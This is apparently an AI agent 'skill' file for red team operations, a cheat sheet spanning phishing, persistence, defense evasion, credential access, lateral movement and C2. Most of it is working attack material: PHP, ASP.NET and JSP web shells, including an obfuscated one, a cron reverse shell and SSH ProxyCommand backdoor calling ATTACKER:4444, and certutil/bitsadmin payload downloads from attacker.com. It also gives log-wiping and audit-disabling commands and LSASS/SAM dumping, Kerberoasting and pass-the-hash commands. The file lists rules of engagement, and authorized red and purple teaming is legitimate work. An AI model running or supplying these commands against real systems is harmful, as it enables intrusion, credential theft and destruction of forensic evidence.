---
name: redteam-ops
description: Red team operations — Adversary simulation, initial access, persistence, lateral movement, credential access, defense evasion, and C2 operations. Use when performing red team engagements, adversary simulation, purple team exercises, or when user mentions red team, APT simulation, adversary emulation, or offensive operations.
---

# RED TEAM OPERATIONS

**Think like an attacker. Operate like a professional. Report like a consultant.**

---

## 1. RED TEAM OPERATIONS LIFECYCLE

```
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│ 1. PLAN  │──→│ 2. GET   │──→│ 3. STAY  │──→│ 4. MOVE  │──→│ 5. ACT   │──→│ 6. REPORT│
│ Objectives│   │ Initial  │   │ Persist  │   │ Lateral  │   │ Achieve  │   │ Document │
│ Scope     │   │ Access   │   │ Beacon   │   │ Movement │   │ Objective│   │ Recommend│
│ Rules     │   │ foothold │   │ Maintain │   │ Expand   │   │ Exfil    │   │ Debrief  │
└──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
```

---

## 2. INITIAL ACCESS

### Social Engineering

```
PHISHING TIERS:
───────────────────────────────────────────────────
Tier 1: Spray phishing
  → Generic email to many users
  → Credential harvesting
  → Low effort, low success rate

Tier 2: Spear phishing
  → Targeted email to specific users
  → Customized content
  → Medium effort, medium success rate

Tier 3: Whaling
  → Targeted at executives
  → Highly customized
  → High effort, high impact
───────────────────────────────────────────────────

PHISHING PAYLOADS:
- Credential harvesting (fake login page)
- Macro-enabled document (Word/Excel)
- HTML smuggling
- QR code phishing
- OAuth consent phishing
- Teams/Slack message with malicious link
```

### Public-Facing Application Exploitation

```
TARGET PRIORITY:
1. VPN concentrators (Fortinet, Pulse Secure, Citrix)
2. Email gateways (Exchange, OWA)
3. Web applications (custom, WordPress, Drupal)
4. API endpoints
5. Cloud services (Azure AD, Okta)

EXPLOITATION CHAINS:
- CVE + known exploit → shell
- SQLi → data access → credential extraction
- SSRF → cloud metadata → IAM keys
- File upload → web shell → RCE
- Auth bypass → admin access → RCE
```

### Supply Chain

```
SUPPLY CHAIN ATTACKS:
- Compromise CI/CD pipeline
- Poison open-source dependency
- Compromise build server
- Target vendor/contractor access
- Compromise software update mechanism
```

---

## 3. PERSISTENCE

### Web Shell Persistence

```bash
# PHP web shell
<?php if(isset($_REQUEST['cmd'])){echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";}?>

# ASP.NET web shell
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>

# JSP web shell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# Stealthy web shell (obfuscated)
<?php $a='asy';$b='stem';$c='ex';$f=$a.$b.$c;$f($_REQUEST['cmd']);?>
```

### Cron/Scheduled Task Persistence

```bash
# Linux cron
echo "* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1" | crontab -

# Windows scheduled task
schtasks /create /tn "Updater" /tr "C:\temp\beacon.exe" /sc minute /mo 5

# Systemd service
cat > /etc/systemd/system/updater.service << 'EOF'
[Unit]
Description=System Updater
[Service]
ExecStart=/tmp/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable updater
```

### Registry Persistence (Windows)

```bash
# Run key
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\beacon.exe"

# Service
sc create "Updater" binPath= "C:\temp\beacon.exe" start= auto
```

### SSH Key Persistence

```bash
# Add attacker key
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# SSH config backdoor
echo "Host *\n  ProxyCommand nc ATTACKER 4444" >> ~/.ssh/config
```

---

## 4. DEFENSE EVASION

### AV/EDR Bypass Techniques

```
TECHNIQUE                    DESCRIPTION
═══════════════════════════════════════════════════════════
Obfuscation                 Encode/encrypt payload
Process injection           Inject into legitimate process
DLL sideloading             Replace legitimate DLL
Living off the land         Use built-in tools (PowerShell, WMI)
Fileless execution          Run in memory only
AMSI bypass                 Bypass PowerShell scanning
ETW patching                Disable event logging
Userland hooks              Hook API calls
Timing-based evasion        Execute during low-monitoring periods
Environment-based           Check for sandbox before executing
```

### Living off the Land (LotL)

```bash
# PowerShell (encoded command)
powershell -enc <base64_payload>

# WMI execution
wmic process call create "C:\temp\beacon.exe"

# BITS jobs
bitsadmin /create myjob
bitsadmin /addfile myjob http://attacker.com/beacon.exe C:\temp\beacon.exe
bitsadmin /jobresume myjob

# Certutil download
certutil -urlcache -split -f http://attacker.com/beacon.exe C:\temp\beacon.exe

# MSBuild (app whitelisting bypass)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

### Log Evasion

```bash
# Clear Windows event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear Linux logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Disable logging
auditctl -e 0  # Disable audit
systemctl stop rsyslog  # Stop syslog
```

---

## 5. LATERAL MOVEMENT

### Credential Access

```bash
# LSASS dump (Windows)
procdump -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::logonpasswords

# SAM dump
reg save hklm\sam sam.dump
reg save hklm\system system.dump
reg save hklm\security security.dump

# Kerberoasting
GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP -request

# AS-REP Roasting
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Pass the Hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:da76f...
```

### Lateral Movement Techniques

```
TECHNIQUE                    TOOL              USE CASE
═══════════════════════════════════════════════════════════
Pass the Hash                psexec/wmiexec    Windows domain
Pass the Ticket              mimikatz          Kerberos
PsExec                       psexec            Remote exec
WMI                          wmiexec           Remote exec
WinRM                        evil-winrm        Remote PowerShell
SSH                          ssh               Linux/Unix
RDP                          rdesktop          Windows GUI
SMB                          smbclient         File share access
DCOM                         dcomexec          Alternative exec
Scheduled Tasks              schtasks          Persistence + exec
```

### Domain Enumeration

```bash
# Bloodhound collection
bloodhound-python -u USER -p PASS -d DOMAIN -c All

# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Find-DomainShare
Get-DomainGPOUserLocalGroupMapping -AdminGroup "Domain Admins"
```

---

## 6. COMMAND & CONTROL (C2)

### C2 Framework Comparison

```
FRAMEWORK          STRENGTHS                    STEALTH
═══════════════════════════════════════════════════════════
Cobalt Strike      Industry standard            High (licensed)
Brute Ratel        Advanced evasion             Very High
Sliver             Open source, modern           High
Havoc              Open source, advanced         High
Mythic             Open source, modular          Medium
Metasploit         Most features                Medium
PoshC2             Python-based, simple          Medium
```

### C2 Communication Patterns

```
PATTERN               DESCRIPTION              DETECTION
═══════════════════════════════════════════════════════════
HTTP/HTTPS polling    Regular HTTP requests     Network monitoring
DNS tunneling         DNS queries for data      DNS monitoring
Domain fronting       CDN → C2                  TLS inspection
Steganography         Image-based C2            Content inspection
Social media          Twitter/GitHub as C2      Behavioral analysis
Encrypted channels    Custom encryption         Traffic analysis
```

### C2 Setup Checklist

```
- [ ] C2 server deployed and configured
- [ ] Listener created (HTTP/DNS/HTTPS)
- [ ] Payload generated (with evasion)
- [ ] Payload delivered to target
- [ ] Beacon/callback received
- [ ] Communication encrypted
- [ ] Malleable C2 profile configured
- [ ] Redirectors set up
- [ ] Logging enabled
- [ ] Opsec considerations documented
```

---

## 7. OBJECTIVES

### Common Red Team Objectives

```
OBJECTIVE                      DESCRIPTION                    IMPACT
═══════════════════════════════════════════════════════════════════
Domain Admin                    Compromise domain admin        Critical
Data Exfiltration              Steal sensitive data            Critical
RCE on critical servers        Execute on key infrastructure  Critical
Financial fraud                Manipulate financial systems    Critical
Credential harvesting          Dump all credentials            High
Lateral movement               Move across entire network     High
Persistence                    Maintain long-term access      High
Physical access                Badge/cloning                   High
WiFi compromise                Access internal WiFi            Medium
Cloud compromise               Access cloud infrastructure    High
```

### Objective Execution

```markdown
## Objective: Domain Admin Compromise

### Plan
1. Initial access via phishing → user workstation
2. Credential access → local admin hash
3. Lateral movement → file server
4. Credential access → domain admin hash
5. DCSync → domain admin credentials
6. Verify → access domain controller

### Status
- [x] Initial access: user@target.com
- [x] Local admin: WORKSTATION-01
- [ ] File server: FILE-SERVER-01
- [ ] Domain admin: target\administrator
- [ ] DCSync: completed
- [ ] Verification: domain controller accessible

### Evidence
- EVD-001: Phishing email delivered
- EVD-002: Credential harvested (hash)
- EVD-003: Lateral movement to file server
- EVD-004: Domain admin hash obtained
- EVD-005: DCSync completed
```

---

## 8. OPSEC FOR RED TEAM

```
RULES OF ENGAGEMENT:
1. Stay within scope at ALL times
2. Document EVERY action
3. Clean up ALL artifacts
4. Do NOT cause service disruption
5. Do NOT access out-of-scope systems
6. Do NOT exfiltrate real customer data
7. Use test data for impact demonstration
8. Rotate C2 infrastructure per engagement
9. Use unique infrastructure per engagement
10. Monitor for blue team detection

TIMING:
- Test during business hours (more realistic)
- But test after hours for sensitive ops
- Be aware of SOC shift changes
- Monitor for incident response activity

ARTIFACT MANAGEMENT:
- Use in-memory payloads when possible
- Clean up dropped files
- Clear logs (document what you cleared)
- Remove persistence during cleanup
- Leave no trace (except documented evidence)
```

---

## 9. RED TEAM CHECKLIST

```
PRE-ENGAGEMENT:
- [ ] Rules of engagement signed
- [ ] Scope boundaries defined
- [ ] Emergency contacts established
- [ ] Objectives defined
- [ ] C2 infrastructure ready
- [ ] Payloads generated and tested
- [ ] Identities and VPN ready

DURING ENGAGEMENT:
- [ ] Initial access achieved
- [ ] Persistence established
- [ ] C2 communication stable
- [ ] Credential access completed
- [ ] Lateral movement performed
- [ ] Objectives achieved
- [ ] All actions documented
- [ ] Evidence collected

POST-ENGAGEMENT:
- [ ] All artifacts cleaned up
- [ ] Persistence removed
- [ ] C2 teardown completed
- [ ] Report written
- [ ] Remediation guidance provided
- [ ] Debrief scheduled
- [ ] Blue team feedback collected
```

---

## 10. PURPLE TEAM EXERCISES

```
PURPLE TEAM WORKFLOW:
1. Red team plans attack scenario
2. Blue team monitors for detection
3. Red team executes attack
4. Blue team documents detection/alerts
5. Both teams review gaps
6. Blue team improves detection
7. Red team adjusts tactics
8. Repeat

ATTACK SCENARIOS:
- Phishing campaign → credential harvest → lateral movement
- Web app exploitation → data exfiltration
- Cloud compromise → resource abuse
- Insider threat simulation
- Ransomware simulation (no actual encryption)
```
